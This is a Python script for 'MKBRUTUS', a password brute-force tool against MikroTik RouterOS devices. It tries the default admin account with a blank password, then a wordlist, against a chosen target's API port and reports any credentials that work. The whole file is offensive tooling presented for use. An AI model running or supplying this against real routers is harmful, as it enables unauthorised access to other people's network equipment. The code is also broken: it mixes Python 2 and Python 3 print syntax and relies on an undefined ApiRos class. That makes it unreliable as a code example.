# -*- coding: utf-8 -*-

"""
MKBRUTUS - Password bruteforcer for MikroTik devices or boxes running RouterOS

Usage:
    mkbr.py [options] <TARGET> <DICT>
    mkbr.py -h | --help
    mkbr.py --version

Options:
    -h --help,         Show this screen.
    --version,         Show version.
    -p, --port=<port>  RouterOS port [default: 8728]
    -u --user=<user>,  User name [default: admin].
    -s --seconds=<s>   Delay seconds between retry attempts [default: 1]
    -q, --quiet        Quiet mode.
"""

from docopt import docopt
import sys
import socket
import time
import codecs


def run(pwd_num):
    run_time = "%.1f" % (time.time() - t)
    status = "Elapsed Time: %s sec | Passwords Tried: %s" % (run_time, pwd_num)
    bar = "_" * len(status)
    print(bar)
    print(status + "\n")


def main(args):

    print("[*] Starting bruteforce attack...")
    print("-" * 33)

    # Looking for default RouterOS creds
    defcredcheck = True

    # Get the number of lines in file
    count = 0
    dict_file = codecs.open(
        args['<DICT>'],
        'rb', encoding='utf-8',
        errors='ignore'
    )
    while 1:
        buffer = dict_file.read(8192 * 1024)
        if not buffer:
            break
        count += buffer.count('\n')
    dict_file.seek(0)

    items = 1
    for password in dict_file.readlines():
        password = password.strip('\n\r ')
        s = None
        for res in socket.getaddrinfo(
            args['<TARGET>'],
            args['--port'],
            socket.AF_UNSPEC,
            socket.SOCK_STREAM
        ):
            af, socktype, proto, canonname, sa = res
            try:
                s = socket.socket(af, socktype, proto)
                # Timeout threshold = 5 secs
                s.settimeout(5)
            except (socket.error):
                s = None
                continue
            try:
                s.connect(sa)
            except (socket.timeout):
                print("[-] Target timed out! Exiting...")
                s.close()
                sys.exit(1)
            except (socket.error):
                err = "[-] SOCKET ERROR! Check Target (IP or PORT parameters)."
                print err + "Exiting..."
                s.close()
                sys.exit(1)
        dict_file.close()
        # modify api here
        apiros = ApiRos(s)

        # First of all,we'll try with RouterOS default credentials ("admin":"")
        while defcredcheck:
            defaultcreds = apiros.login("admin", "")
            login = ''.join(defaultcreds[0][0])

            print("[-] Trying with default credentials on RouterOS...")
            print()

            if login == "!done":
                alert = "[+] Login successful!!!"
                alert += "Default RouterOS credentials were not changed."
                print alert + "Log in with admin:<BLANK>"
                sys.exit(0)
            else:
                alert = "[-] Default RouterOS credentials were unsuccessful,"
                alert += "trying with " + str(count) + " passwords in list..."
                print alert
                print ""
                defcredcheck = False
                time.sleep(1)

        loginoutput = apiros.login(args['--user'], password)
        login = ''.join(loginoutput[0][0])

        if not args['--quiet']:
            alert = "[-] Trying {} of {} passwords".format(
                str(items), str(count))
            print alert + "- current" + password
        if login == "!done":
            alert = "[+] Login successful!!!"
            alert += "User: " + args['--user'] + " Password: " + password
            print alert
            run(items)
            return
        items += 1
        time.sleep(int(args['--seconds']))

    alert = "[*] ATTACK FINISHED! No suitable credentials were found."
    alert += "Try again with a different wordlist."
    print alert
    run(count)


if __name__ == '__main__':
    try:
        args = docopt(__doc__, version='v1.0.2')
        t = time.time()
        main(args)
    except KeyboardInterrupt:
        print 'Aborted by user. Exiting... '
        sys.exit(0)
